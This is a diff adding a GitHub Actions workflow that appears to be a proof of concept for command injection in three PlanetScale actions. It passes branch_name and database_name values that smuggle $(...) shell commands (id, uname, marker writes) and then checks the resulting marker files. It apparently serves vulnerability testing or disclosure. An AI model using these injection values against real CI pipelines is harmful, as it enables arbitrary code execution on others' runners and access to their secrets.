@@ -1,0 +1,53 @@
+name: raptor-triage
+on:
+  workflow_dispatch:
+
+jobs:
+  create-path:
+    name: create-branch-action create-path eval
+    runs-on: ubuntu-latest
+    steps:
+      - name: inject via branch_name (check_exists absent => create path eval)
+        uses: planetscale/create-branch-action@allow-duplicates
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'r4pA$(id>/github/workspace/a_marker.txt;uname${IFS}-a>>/github/workspace/a_marker.txt;echo${IFS}R4PT0R-A-OK>>/github/workspace/a_marker.txt)end'
+      - name: show marker A
+        run: |
+          echo "--- a_marker.txt ---"
+          cat a_marker.txt || echo "NO A MARKER"
+
+  password-action:
+    name: create-branch-password-action eval
+    runs-on: ubuntu-latest
+    steps:
+      - name: inject via branch_name
+        uses: planetscale/create-branch-password-action@v3
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'r4pB$(id>/github/workspace/b_marker.txt;echo${IFS}R4PT0R-B-OK>>/github/workspace/b_marker.txt)end'
+          name: "pocpass"
+      - name: show marker B
+        run: |
+          echo "--- b_marker.txt ---"
+          cat b_marker.txt || echo "NO B MARKER"
+
+  deploy-action:
+    name: deploy-deploy-request-action eval
+    runs-on: ubuntu-latest
+    steps:
+      - name: inject via database_name
+        uses: planetscale/deploy-deploy-request-action@main
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: 'r4pC$(id>/github/workspace/c_marker.txt;echo${IFS}R4PT0R-C-OK>>/github/workspace/c_marker.txt)end'
+          number: "1"
+      - name: show marker C
+        run: |
+          echo "--- c_marker.txt ---"
+          cat c_marker.txt || echo "NO C MARKER"
